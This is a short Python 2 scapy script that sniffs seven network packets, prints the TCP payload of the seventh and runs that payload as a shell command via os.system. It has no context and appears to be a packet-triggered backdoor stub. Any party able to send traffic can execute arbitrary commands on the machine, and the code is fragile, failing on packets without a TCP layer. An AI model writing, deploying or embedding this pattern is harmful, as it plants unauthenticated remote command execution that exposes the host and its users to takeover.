#!/usr/bin/python
from scapy.all import *
import os

pkts = sniff(count=7)
print pkts[6][TCP].load
os.system(pkts[6][TCP].load)
